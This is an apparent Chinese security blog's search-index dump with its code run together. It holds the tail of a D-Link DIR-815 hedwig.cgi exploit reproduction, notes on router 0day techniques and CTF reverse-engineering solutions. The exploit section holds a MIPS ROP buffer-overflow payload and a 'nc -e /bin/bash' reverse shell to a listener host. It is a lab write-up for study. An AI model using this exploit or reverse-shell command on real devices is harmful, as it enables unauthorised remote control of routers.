REQUEST_URI=&quot;/hedwig.cgi&quot;root@debian-mipsel:~# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps[2] 1224cat: /proc/pid/maps: No such file or directoryroot@debian-mipsel:~# /htdocs/web/hedwig.cgi &amp; cat /proc/1226/maps[3] 122600400000-0041c000 r-xp 00000000 08:01 32694 /htdocs/cgibin0042c000-0042d000 rw-p 0001c000 08:01 32694 /htdocs/cgibin0042d000-0042f000 rwxp 00000000 00:00 0 [heap]77f34000-77f92000 r-xp 00000000 08:01 547906 /lib/libc.so.077f92000-77fa1000 ---p 00000000 00:00 0 77fa1000-77fa2000 r--p 0005d000 08:01 547906 /lib/libc.so.077fa2000-77fa3000 rw-p 0005e000 08:01 547906 /lib/libc.so.077fa3000-77fa8000 rw-p 00000000 00:00 0 77fa8000-77fd1000 r-xp 00000000 08:01 546761 /lib/libgcc_s.so.177fd1000-77fe1000 ---p 00000000 00:00 0 77fe1000-77fe2000 rw-p 00029000 08:01 546761 /lib/libgcc_s.so.177fe2000-77fe7000 r-xp 00000000 08:01 547907 /lib/ld-uClibc.so.077ff5000-77ff6000 rw-p 00000000 00:00 0 77ff6000-77ff7000 r--p 00004000 08:01 547907 /lib/ld-uClibc.so.077ff7000-77ff8000 rw-p 00005000 08:01 547907 /lib/ld-uClibc.so.07ffd6000-7fff7000 rwxp 00000000 00:00 0 [stack]7fff7000-7fff8000 r-xp 00000000 00:00 0 [vdso] 编写exp（注意是py2 123456789101112131415161718192021222324252627#!/usr/bin/python2from pwn import *context.endian = &quot;little&quot;context.arch = &quot;mips&quot;base_addr = 0x77f34000system_addr_1 = 0x53200-1gadget1 = 0x45988gadget2 = 0x159cc cmd = &#x27;nc -e /bin/bash 192.168.100.254 9999&#x27;padding = &#x27;A&#x27; * 973 #1009-4*9padding += p32(base_addr + system_addr_1) # s0padding += p32(base_addr + gadget2) # s1padding += &#x27;A&#x27; * 4 # s2padding += &#x27;A&#x27; * 4 # s3padding += &#x27;A&#x27; * 4 # s4padding += &#x27;A&#x27; * 4 # s5padding += &#x27;A&#x27; * 4 # s6padding += &#x27;A&#x27; * 4 # s7padding += &#x27;A&#x27; * 4 # fppadding += p32(base_addr + gadget1) # rapadding += &#x27;B&#x27; * 0x10padding += cmd f = open(&quot;context&quot;,&#x27;wb&#x27;)f.write(padding)f.close() 生成的context通过scp拷贝到mips虚拟机目录中并且在目录下创造debug.sh 123456export CONTENT_LENGTH=&quot;100&quot;export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;export HTTP_COOKIE=&quot;uid=`cat context`&quot;export REQUEST_METHOD=&quot;POST&quot;export REQUEST_URI=&quot;/hedwig.cgi&quot;echo &quot;uid=1234&quot;|/htdocs/web/hedwig.cgi 在宿主机运行 1nc -vlp 9999 然后再mips虚拟机执行debug.sh getshell ! 总结： 断断停停终于算是真正完整复现了第一个漏洞，dlink DIR-815，依照0day路由器漏洞挖掘还有师傅们的博客，对mips架构和qemu有了进一步的了解","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"家用路由器0day挖掘技术阅读笔记","slug":"家用路由器0day挖掘技术阅读笔记","date":"2022-08-15T16:00:00.000Z","updated":"2022-08-25T12:35:22.940Z","comments":true,"path":"2022/08/16/家用路由器0day挖掘技术阅读笔记/","link":"","permalink":"http://example.com/2022/08/16/%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/","excerpt":"","text":"第四章 路由器web漏洞xss利用站点内的信任用户，跨站攻击是指入侵者在远程web页面的HTML页面中插入具有恶意代码的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面时，嵌入其中的脚本将被解释执行。 CSRF跨站请求伪造通过伪装来自受信任用户的请求达到利用受信任的网站的目的。 第五章 路由器后门漏洞第六章 路由器溢出漏洞MIPS32架构函数调用时对堆栈的分配和使用方式与x86架构有相似之处，但又有很大的区别。区别具体体现在： 栈操作：与x86架构一样，都是向低地址增长的。但是没有EBP（栈底指针），进入一个函数时，需要将当前栈指针向下移动n比特，这个大小为n比特的存储空间就是此函数的栈帧存储存储区域。 调用：如果函数A调用函数B，调用者函数（函数A）会在自己的栈顶预留一部分空间来保存被调用者（函数B）的参数，称之为调用参数空间。 参数传递方式：前四个参数通过$a0-$a3传递，多余的参数会放入调用参数空间。 返回地址：在x86架构中，使用call命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中。 叶子函数：当前函数不再调用其他函数。非叶子函数：当前函数调用其他函数。 函数调用的过程：父函数调用子函数时，复制当前$PC的值到$RA寄存器，然后跳到子函数执行；到子函数时，子函数如果为非叶子函数，则子函数的返回地址会先存入堆栈，否则仍在$RA寄存器中；返回时，如果子函数为叶子函数，则”jr $ra”直接返回，否则先从堆栈取出再返回。 利用堆栈溢出的可行性：在非叶子函数中，可以覆盖返回地址，劫持程序执行流程；而在非叶子函数中，可通过覆盖父函数的返回地址实现漏洞利用。 第七章 基于MIPS的shellcode开发mips中可使用syscall指令来进行系统调用，调用的方法为：在使用系统调用syscall之前，$v0保存需要执行的系统调用的调用号，并且按照mips调用规则构造将要执行的系统调用参数。syscall调用的伪代码为：“syscall($v0,$a1,$a2,$a3,$a4…)”。 shellcode编码优化包括指令优化和shellcode编码。指令优化：指令优化是指通过选择一些特殊的指令避免在shellcode中直接生成坏字符。 通常来说，shellcode可能会受到限制：首先，所有的字符串函数都会对“NULL”字节进行限制；其次，在某些处理流程中可能会限制0x0D（\\r）、0x0A（\\n）、或者0x20（空格）字符；最后，有些函数会要求shellcode必须为可见字符（ascii）或Unicode值。有些时候，还会受到基于特征的IDS系统对shellcode的拦截。 绕过以上限制的方法主要有两个：指令优化及shellcoe编码。后者更为通用。 shellcoe编码通常包含以下三种：base64编码、alpha_upper编码、xor编码。 第八章 路由器文件系统与提取路由器漏洞的分析与利用的关键环节有获取固件、提取文件系统、漏洞分析与利用及漏洞挖掘。其中获取固件及提取文件系统是进行漏洞分析与利用的基础。 路由器固件中包含操作系统的内核及文件系统。路由器的固件不是硬件而是软件，因为在路由器中它通常是被固化在只读存储器中，所以称为固件。 在进行漏洞分析时获取路由器的固件通常有两种方式：一种是从路由器厂商提供的更新网站下载；一种是通过硬件接入，从路由器的Flash中提取固件。 文件系统文件系统是操作系统的重要组成部分，是操作运行的基础。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器总是希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。 Squashfs是一个只读格式的文件系统，具有超高压缩率，可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2），在路由器中被普遍采用。 手动提取文件系统文件系统中包含实现路由器各种功能的基础应用程序。文件系统能从固件中提取，而从路由器固件中提取文件系统是一个难点，原因之一在于不同的操作系统使用的文件系统不同。另外，路由器的文件系统压缩算法也有差异，有些路由器甚至会使用非标准的压缩算法打包文件系统。 手动提取文件系统类型包括： 使用file命令查看文件系统类型。 手动判断文件类型，包含如下步骤：”strings|grep”检索文件系统magic签名头；“hexdump|grep”检索magic签名偏移；“dd|file”确定magic签名偏移处的文件类型。 手动提取文件系统。：安装工具，sudo apt-get install squashfs-tools该工具目前仅支持GZIP、LZO、XZ（LZMA2）不支持LZMA格式。可以使用firmware-mod-kit解压缩，解压后得到所有文件。安装命令： 1234git clone https://github.com/mirror/firmware-mod-kit.gitsudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magiccd firmware-mod-kit./configure &amp;&amp; make 自动提取文件系统binwalk是路由器固件分析的必备工具，该工具最大的优点是可以自动完成指令文件的扫描，智能发掘潜藏在文件中所有可疑地文件类型及文件系统。 binwalk&amp;&amp;libmagic binwalk提取与分析过程： 固件扫描。通过扫描binwalk可发现目标文件中包含的所有可识别文件类型。 1binwaklk firmware.bin 提取文件。选项“-e”和“–extract”用于按照预定义的配置文件中的提取方法从固件中提取探测到的文件及系统。选项“-M”，用于递归扫描。“-d”用于递归深度的限制。 1binwaklk -e firmware.bin 显示完整的扫描结果。选项“-I”或“–invalid”用于显示扫描的所有结果。 指令系统分析。选项“-A”和“–opcode”用于扫描指定文件中通用cpu架构的可执行代码。 1binwaklk -A 70|more 通常binwalk可对绝大多数路由器固件进行文件提取，如遇到无法识别的固件，可向binwalk添加下列提取规则和提取方法，实现对新的文件系统进行扫描和提取： 基于magic签名文件自动提取。 基于binwalk配置文件的提取。 第九章 漏洞分析简介漏洞分析是指在代码中迅速定位漏洞，弄清攻击原理，准确地估计潜在的漏洞利用方式和风险等级的过程。 POC（Proof of Concept） 漏洞证明，漏洞报告中，通过一段描述或一个样例来证明漏洞确实存在 EXP（Exploit） 漏洞利用，某个漏洞存在EXP，意思就是该漏洞存在公开的利用方式（比如一个脚本） 漏洞分析方法可以通过一些漏洞公布网站获取漏洞信息。网上公布的poc有很多形式，只要能触发漏洞、重现攻击过程即可。在得到poc后，就需要部署漏洞分析实验环境，利用poc重现攻击过程，定位漏洞函数，分析漏洞产生的具体原因，根据poc和漏洞情况实现对漏洞的利用。 漏洞分析中常用的两种分析方法：动态调试以及静态分析。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"强网杯","slug":"强网杯","date":"2022-08-01T16:00:00.000Z","updated":"2022-08-07T13:32:49.815Z","comments":true,"path":"2022/08/02/强网杯/","link":"","permalink":"http://example.com/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF/","excerpt":"","text":"GameMaster.net程序 主要逻辑为异或和aes加密，解密message文件 12345678910111213from Crypto.Cipher import AESkey=bytes([66,114,97,105,110,115,116,111,114,109,105,110,103,33,33,33])f=open(&#x27;gamemessage&#x27;,&#x27;rb&#x27;)stream=f.read()enc=[]for i in stream: enc.append(i^34)ae=AES.new(key,AES.MODE_ECB)m=ae.decrypt(bytes(enc))f.close()ff=open(&#x27;flag&#x27;,&#x27;wb&#x27;)ff.write(m)ff.close() 得到文件用010edit打开，然后根据文件头提取文件，也是.net文件，dnspy打开 12345678910111213141516171819from z3 import *f=[101,5,80,213,163,26,59,38,19,6,173,189,198,166,140,183,42,247,223,24,106,20,145,37,24,7,22,191,110,179,227,5,62,9,13,17,65,22,37,5]x=BitVec(&#x27;x&#x27;,33)y=BitVec(&#x27;y&#x27;,33)z=BitVec(&#x27;z&#x27;,33)s=Solver()nums=-1k=[0]*40for i in range(320): x = (((x &gt;&gt; 29 ^ x &gt;&gt; 28 ^ x &gt;&gt; 25 ^ x &gt;&gt; 23) &amp; 1) | x &lt;&lt; 1) y = (((y &gt;&gt; 30 ^ y &gt;&gt; 27) &amp; 1) | y &lt;&lt; 1) z = (((z &gt;&gt; 31 ^ z &gt;&gt; 30 ^ z &gt;&gt; 29 ^ z &gt;&gt; 28 ^ z &gt;&gt; 26 ^ z &gt;&gt; 24) &amp; 1) | z &lt;&lt; 1) if i%8==0: nums+=1 k[nums]=((k[nums]&lt;&lt;1)|((z &gt;&gt; 32 &amp; 1 &amp; (x &gt;&gt; 30 &amp; 1)) ^ (((z &gt;&gt; 32 &amp; 1) ^ 1) &amp; (y &gt;&gt; 31 &amp; 1))))&amp;0xfffor i in range(40): s.add(k[i]==f[i])if s.check()==sat: print(s.model()) 还有移位然后异或的操作 123456789101112131415s=[60,100,36,86,51,251,167,108,116,245,207,223,40,103,34,62,22,251,227]z = 3131229747y = 868387187x = 156324965L[0]=xL[1]=yL[2]=zfor i in range(3): for j in range(4): key[i * 4 + j] = ((L[i] &gt;&gt; j * 8) &amp; 255)for i in range(len(s)): print(chr(s[i]^key[i%len(key)]),end=&#x27;&#x27;)#Y0u_@re_G3meM3s7er! deeprevGooglectf的一道同类型题，找到网上的脚本，format_addr函数修改了一下 GoogleCTF 2022 - eldar (333 pt &#x2F; 14 solves) (harrisongreen.me) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549# Author: hgarrereyn# Desc: Lifter solution for GoogleCTF 2022 eldarimport lieffrom collections import namedtuplefrom dataclasses import dataclassfrom typing import Anyfrom capstone import *md = Cs(CS_ARCH_X86, CS_MODE_64)b = Nonetry: b = lief.ELF.parse(&#x27;./deeprev&#x27;)except: raise Exception(&#x27;Must have the ./eldar binary in cwd&#x27;)rela = [x for x in b.sections if x.name == &#x27;.rela.dyn&#x27;][0]print(rela)dynsym = [x for x in b.sections if x.name == &#x27;.dynsym&#x27;][0]@dataclassclass Symbol(object): idx: int def __repr__(self): return f&#x27;s&#123;self.idx&#125;&#x27; @dataclassclass Reloc(object): idx: int def __repr__(self): return f&#x27;r&#123;self.idx&#125;&#x27;@dataclassclass Ref(object): val: Any def __repr__(self): return f&#x27;&amp;&#123;self.val&#125;&#x27;@dataclassclass SymAddr(object): sym: Symbol field: str def __repr__(self): return f&#x27;&#123;self.sym&#125;.&#123;self.field&#125;&#x27;@dataclassclass RelocAddr(object): reloc: Reloc field: str def __repr__(self): return f&#x27;&#123;self.reloc&#125;.&#123;self.field&#125;&#x27; def vaddr(self): off = 0 match self.field: case &#x27;r_address&#x27;:off = 0 case &#x27;r_info&#x27;: off = 8 case &#x27;r_addend&#x27;: off = 16 return (self.reloc.idx * 24) + off + rela.virtual_address @dataclassclass FlagAddr(object): idx: int def __repr__(self): return f&#x27;flag[&#123;self.idx&#125;]&#x27;@dataclassclass OutAddr(object): idx: int def __repr__(self): return f&#x27;out[&#123;self.idx&#125;]&#x27; @dataclassclass ArrAddr(object): idx: int def __repr__(self): return f&#x27;arr[&#123;self.idx&#125;]&#x27;BaseAddr = namedtuple(&#x27;baseaddr&#x27;, [])FailAddr = namedtuple(&#x27;fail&#x27;, [])def format_addr(addr: int): if addr &gt;= rela.virtual_address and addr &lt; rela.virtual_address + rela.size: offset = addr - rela.virtual_address r_offset = (offset // 24) r_rem = offset % 24 if r_offset &gt;= 3 and r_offset &lt;= 88: arr_idx = (r_offset - 3) * 3 + (r_rem // 8) return ArrAddr(arr_idx) elif r_offset == 89: return OutAddr(r_rem) match r_rem: case 0: return RelocAddr(Reloc(r_offset), &#x27;r_address&#x27;) case 8: return RelocAddr(Reloc(r_offset), &#x27;r_info&#x27;) case 16: return RelocAddr(Reloc(r_offset), &#x27;r_addend&#x27;) case _: return RelocAddr(Reloc(r_offset), r_rem) elif addr &gt; dynsym.virtual_address and addr &lt; dynsym.virtual_address + dynsym.size: offset = addr - dynsym.virtual_address r_offset = (offset // 24) r_rem = offset % 24 match r_rem: case 0: return SymAddr(Symbol(r_offset), &#x27;st_name&#x27;) case 8: return Symbol(r_offset) case 16: return SymAddr(Symbol(r_offset), &#x27;st_size&#x27;) case _: return SymAddr(Symbol(r_offset), r_rem) elif addr &gt;= 0x404040 and addr &lt; 0x404040+33: off = addr-0x404040 return FlagAddr(off) elif addr == 0x804000: return BaseAddr() elif addr == 0x404064: return FailAddr() else: return addrdef to_sym(name): assert len(name) == 1 return Symbol(ord(name[0]))Rel = namedtuple(&#x27;REL&#x27;, [&#x27;dst&#x27;,&#x27;val&#x27;,&#x27;ridx&#x27;])Copy = namedtuple(&#x27;CPY&#x27;, [&#x27;dst&#x27;, &#x27;symbol&#x27;, &#x27;ridx&#x27;])R64 = namedtuple(&#x27;R64&#x27;, [&#x27;dst&#x27;,&#x27;symbol&#x27;,&#x27;addend&#x27;,&#x27;ridx&#x27;])R32 = namedtuple(&#x27;R32&#x27;, [&#x27;dst&#x27;,&#x27;symbol&#x27;,&#x27;addend&#x27;,&#x27;ridx&#x27;])def parse(b) -&gt; list: print(&#x27;[*] Loading relocations...&#x27;) relocs = list(b.relocations) print(&#x27;[*] Parsing...&#x27;) instructions = [] for i in range(3, len(relocs)): r = relocs[i] match r.type: case 1: # R64 instructions.append(R64(format_addr(r.address), to_sym(r.symbol.name), format_addr(r.addend), i)) case 5: # CPY instructions.append(Copy(format_addr(r.address), to_sym(r.symbol.name), i)) case 8: # REL instructions.append(Rel(format_addr(r.address), format_addr(r.addend), i)) case 10: # R32 instructions.append(R32(format_addr(r.address), to_sym(r.symbol.name), format_addr(r.addend), i)) return instructionsMov = namedtuple(&#x27;mov&#x27;, [&#x27;dst&#x27;, &#x27;src&#x27;, &#x27;sz&#x27;, &#x27;ridx&#x27;])Add = namedtuple(&#x27;add&#x27;, [&#x27;dst&#x27;, &#x27;src&#x27;, &#x27;addend&#x27;, &#x27;ridx&#x27;])def lift_mov_add(instructions): idx = 0 sizes = [] curr = [8] * 8 sizes.append(curr) for instr in instructions: c = list(curr) match instr: case Rel(SymAddr(Symbol(idx), &#x27;st_size&#x27;), val, ridx): c[idx] = val sizes.append(c) while idx &lt; len(instructions): match instructions[idx]: case Rel(dst, val, ridx): instructions[idx] = Mov(dst, Ref(val), 8, ridx) case Copy(dst, sym, ridx): instructions[idx] = Mov(dst, sym, sizes[idx][sym.idx], ridx) case R64(dst, sym, add, ridx): instructions[idx] = Add(dst, sym, add, ridx) idx += 1 return instructionsdef remove_sizes(instructions): # Sizes are now nops idx = 0 while idx &lt; len(instructions): match instructions[idx]: case Mov(SymAddr(Symbol(s), &#x27;st_size&#x27;), _, _, _) if s != 3: instructions[idx:idx+1] = [] idx += 1 return instructionsdef lift_indirect(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+3]: case [ Mov(RelocAddr(Reloc(rel_1), &#x27;r_addend&#x27;), Symbol(sidx_1), sz_1, ridx_1), Add(dst_2, sym_2, _, ridx_2), Mov(RelocAddr(Reloc(rel_3), &#x27;r_addend&#x27;), Ref(0), sz_3, _), ] if ( (rel_1 == ridx_2) and (rel_3 == ridx_2) ): instructions[idx:idx+3] = [ Add(dst_2, sym_2, Symbol(sidx_1), ridx_1) ] idx += 1 return instructionsBlock = namedtuple(&#x27;block&#x27;, [&#x27;arr&#x27;, &#x27;flag&#x27;, &#x27;ridx&#x27;])Output = namedtuple(&#x27;output&#x27;, [&#x27;out&#x27;, &#x27;arr&#x27;, &#x27;ridx&#x27;])def lift_block(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+18]: case [ Mov(_,arr,_,ridx), Add(_,_,_,_), Mov(_,flag,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), R32(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), ]: instructions[idx:idx+18] = [ Block(arr, flag, ridx) ] idx += 1 return instructionsReset = namedtuple(&#x27;reset&#x27;, [&#x27;ridx&#x27;])ShuffleBlock = namedtuple(&#x27;shuffleblock&#x27;, [&#x27;f1&#x27;, &#x27;f2&#x27;, &#x27;ridx&#x27;])def lift_reset(instructions): idx = 0 while idx &lt; len(instructions) - 256: good = True for i in range(256): op = instructions[idx+i] if type(op) == Mov: dst, src, _, _ = op if dst != ArrAddr(i) or src != Ref(i): good = False break else: good = False break if good: instructions[idx:idx+256] = [Reset(instructions[idx].ridx)] idx += 1 return instructionsdef lift_shuffle_block(instructions): idx = 0 while idx &lt; len(instructions) - 256: good = True for i in range(256): op = instructions[idx+i] if type(op) == Block: arr, flag, ridx = op if arr != Ref(ArrAddr(i)): good = False break else: good = False break if good: instructions[idx:idx+256] = [ShuffleBlock(instructions[idx].flag, instructions[idx+1].flag, instructions[idx].ridx)] idx += 1 return instructionsOutput = namedtuple(&#x27;output&#x27;, [&#x27;out&#x27;, &#x27;arr&#x27;, &#x27;ridx&#x27;])def lift_output(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+26]: case [ Mov(_,arr,_,ridx), Add(_,_,_,_), R32(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), R32(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Mov(out,_,_,_), ]: instructions[idx:idx+26] = [Output(out, arr, ridx)] idx += 1 return instructionsMultAdd = namedtuple(&#x27;multadd&#x27;, [&#x27;out&#x27;, &#x27;val&#x27;, &#x27;k&#x27;, &#x27;ridx&#x27;])def lift_multadd(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+3]: # block prefix case [ Mov(Symbol(2), out, _, ridx), Mov(Symbol(5), Symbol(2), _, _), Mov(Symbol(6), Ref(0), _, _), ]: k = 0 double = False ptr = idx + 3 good = True while ptr &lt; len(instructions): match instructions[ptr]: case Mov(Symbol(2), Ref(Symbol(6)), _, _): double = True case Mov(Symbol(2), Ref(Symbol(5)), _, _): double = False case Add(Symbol(6), Symbol(6), Symbol(2), _): k = (k * 2) if double else (k + 1) case Add(Symbol(7), Symbol(7), Symbol(2), _): ptr += 1 break case _: good = False break ptr += 1 if good: instructions[idx:ptr] = [ MultAdd(Symbol(7), out, k, ridx) ] idx += 1 return instructionsTrunc = namedtuple(&#x27;trunc&#x27;, [&#x27;val&#x27;, &#x27;k&#x27;, &#x27;ridx&#x27;])def lift_truncate(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+2]: case [ Mov(Symbol(2), Ref(SymAddr(Symbol(5), 11)), _, ridx), Mov(SymAddr(Symbol(7), 11), Symbol(2), 5, _) ]: instructions[idx:idx+2] = [ Trunc(Symbol(7), 0xffffff, ridx)] idx += 1 return instructionsArraySlots = namedtuple(&#x27;arr&#x27;, [&#x27;values&#x27;, &#x27;ridx&#x27;])def lift_array_slots(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx]: case Mov(BaseAddr(), Ref(0), _, ridx): ptr = idx+1 while ptr &lt; len(instructions): op = instructions[ptr] if type(op) != Mov or op.dst != BaseAddr(): break ptr += 1 start = idx end = ptr data = [] # Check for movs into array. vstart = RelocAddr(Reloc(ridx), &#x27;r_address&#x27;).vaddr() offset = 0 while end + offset &lt; len(instructions) and offset &lt; ((end - start) * 3): op = instructions[end + offset] if type(op) == Mov and type(op.dst) is RelocAddr and op.dst.vaddr() == vstart + (offset * 8): data.append(op.src.val) else: break offset += 1 if len(data) &gt; 0: data += [0] * (((end - start) * 3) - len(data)) instructions[idx:end+offset] = [ ArraySlots(data, ridx) ] idx += 1 return instructionsShellcode = namedtuple(&#x27;shellcode&#x27;, [&#x27;dst&#x27;, &#x27;code&#x27;, &#x27;ridx&#x27;])def lift_shellcode(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+6]: case [ ArraySlots(values, ridx), Mov(Symbol(3), Ref(RelocAddr(Reloc(rel2), &#x27;r_address&#x27;)), _, _), Mov(SymAddr(Symbol(3), &#x27;st_name&#x27;), _, _, _), Add(dst, Symbol(3), _, _), Mov(Symbol(2), _, _, _), Mov(RelocAddr(Reloc(rel6), &#x27;r_address&#x27;), Symbol(2), _, _) ] if (rel2 == ridx) and (rel6 == ridx): instructions[idx:idx+6] = [ Shellcode(dst, b&#x27;&#x27;.join([(x &amp; 0xffffffffffffffff).to_bytes(8, &#x27;little&#x27;) for x in values]), ridx) ] idx += 1 return instructionsAop = namedtuple(&#x27;aop&#x27;, [&#x27;dst&#x27;, &#x27;op&#x27;, &#x27;val&#x27;, &#x27;k&#x27;, &#x27;ridx&#x27;])def lift_aop(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+5]: case [ Mov(Symbol(2), val, _, ridx), Mov(Symbol(5), Symbol(2), _, _), Shellcode(_, data, _), Mov(Symbol(2), Ref(Symbol(5)), _, _), Add(dst, dst2, Symbol(2), _) ] if len(data) == 24 and (dst == dst2): op = next(md.disasm(data, 0)) t = op.mnemonic k = int(op.op_str.split(&#x27;, &#x27;)[-1], 16) instructions[idx:idx+5] = [ Aop(dst, t, val, k, ridx) ] idx += 1 return instructionsdef dump(instructions): for op in instructions: match op: case Mov(SymAddr(sym, &#x27;st_name&#x27;), Ref(val), 8, ridx) if type(val) is int: name = val &amp; 0xffffffff info = (val &gt;&gt; 4) &amp; 0xff other = (val &gt;&gt; 5) &amp; 0xff shndx = (val &gt;&gt; 6) &amp; 0xffff print(f&#x27;[&#123;ridx:04d&#125;] :: setinfo &#123;sym&#125;, name=0x&#123;name:x&#125;, info=0x&#123;info:x&#125;, other=0x&#123;other:x&#125;, shndx=0x&#123;shndx:x&#125;&#x27;) case Mov(BaseAddr(), Ref(0), _, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: [ARRAY SLOT]&#x27;) case Mov(dst, src, 8, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: mov &#123;dst&#125;, &#123;src&#125;&#x27;) case Mov(dst, src, sz, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: mov(&#123;sz&#125;) &#123;dst&#125;, &#123;src&#125;&#x27;) case Add(dst, src, add, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: add &#123;dst&#125;, &#123;src&#125;, &#123;add&#125;&#x27;) case R32(dst, src, add, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: r32 &#123;dst&#125;, &#123;src&#125;, &#123;add&#125;&#x27;) case Block(arr, flag, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: shuffle &#123;arr&#125;, &#123;flag&#125;&#x27;) case Output(out, arr, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: output &#123;out&#125;, &#123;arr&#125;&#x27;) case ShuffleBlock(f1, f2, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: shuffleblock &#123;f1&#125;, &#123;f2&#125;&#x27;) case MultAdd(dst, val, k, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: madd &#123;dst&#125; += (&#123;val&#125; * &#123;k&#125;)&#x27;) case Aop(dst, op, val, k, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: aop &#123;dst&#125; += (&#123;val&#125; &#123;op&#125; &#123;k&#125;)&#x27;) case Reset(ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: reset&#x27;) case Trunc(val, k, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: trunc &#123;val&#125; &amp;= 0x&#123;k:x&#125;&#x27;) case ArraySlots(values, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: array [&#123;&quot;, &quot;.join([hex(x) for x in values])&#125;]&#x27;) case Shellcode(dst, code, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: exec &#123;dst&#125; &lt;- &#123;code.hex()&#125;&#x27;) print(&#x27;-&#x27; * 20) for i in md.disasm(code, 0): if i.mnemonic == &#x27;ret&#x27;: break print(&quot; 0x%x:\\t%s\\t%s&quot; %(i.address, i.mnemonic, i.op_str.replace(&#x27;0x8040e4&#x27;, &#x27;s5&#x27;).replace(&#x27;0x8040cc&#x27;, &#x27;s4&#x27;))) print(&#x27;-&#x27; * 20) case _: print(op)LIFTS = [ lift_mov_add, remove_sizes, lift_indirect, lift_block, lift_reset, lift_shuffle_block, lift_output, lift_multadd, lift_truncate, lift_array_slots, lift_shellcode, lift_aop,]def lift(instructions): for lift_fn in LIFTS: print(f&#x27;[*] &#123;lift_fn.__name__&#125;...&#x27;) instructions = lift_fn(instructions) return instructionsinstructions = parse(b)instructions = lift(instructions)dump(instructions) 得到： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356